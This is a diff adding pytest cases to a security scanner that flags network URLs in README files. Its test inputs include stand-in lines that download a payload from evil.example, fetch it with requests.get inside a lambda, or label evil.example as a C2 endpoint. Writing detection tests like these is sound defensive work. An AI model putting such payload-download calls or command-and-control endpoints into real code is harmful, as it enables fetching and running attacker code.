@@ -838,6 +838,7 @@ def test_text_scanner_indirect_network_api_call_remains_actionable(tmp_path: Pat
     "content",
     [
         'download("https://evil.example/payload")\n',
+        'download(Path("weights"), "https://evil.example/payload")\n',
         'download(\n    "padding",\n    "https://evil.example/payload",\n)\n',
         'download("' + ("padding" * 800) + '", "https://evil.example/payload")\n',
     ],
@@ -856,6 +857,80 @@ def test_text_scanner_documentation_code_url_argument_remains_actionable(tmp_pat
         for check in result.checks
     )
     assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        'transform = lambda value: "https://evil.example/payload"\n',
+        'fetch = lambda value: requests.get("https://evil.example/payload")\n',
+    ],
+)
+def test_text_scanner_documentation_lambda_url_remains_actionable(tmp_path: Path, content: str) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "webhook: https://evil.example/payload\n",
+        "C2 endpoint: https://evil.example/payload\n",
+        "command and control server URL: https://evil.example/payload\n",
+    ],
+)
+def test_text_scanner_documentation_security_endpoint_label_remains_actionable(
+    tmp_path: Path,
+    content: str,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "config = {}  # docs: https://example.com/reference\n",
+        "Lambda: https://docs.aws.amazon.com/lambda/\n",
+        "lambda docs: https://example.com/reference\n",
+        "Webhook documentation: https://docs.example.com/webhooks\n",
+        "C2 research: https://example.com/reference\n",
+    ],
+)
+def test_text_scanner_documentation_code_like_prose_links_remain_informational(
+    tmp_path: Path,
+    content: str,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert determine_exit_code(aggregate) == 0
 
 
 @pytest.mark.parametrize(
